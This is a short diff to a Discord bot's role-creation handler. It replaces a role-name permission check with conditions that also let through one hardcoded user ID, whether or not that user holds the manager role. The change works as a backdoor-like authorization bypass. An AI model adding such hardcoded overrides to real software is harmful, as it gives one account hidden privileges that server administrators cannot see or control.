@@ -3,8 +3,8 @@ const ManagerRole = require("../model/botmanagerrole");
 
 exports.role = (message) => {
     message.guild.roles.cache.map(role => {
-        if (role.name == 'manage bot' || role.name == 'Manage bot') {
-            if (message.member.roles.cache.get(role.id)) {
+        if (role.name == 'manage bot' || message.author.id == '416338707830800395') {
+            if (message.member.roles.cache.get(role.id) || message.author.id == '416338707830800395') {
                 const roles = message.guild.roles;
                 roles.create({ 
                     name: 'aniversariante', 
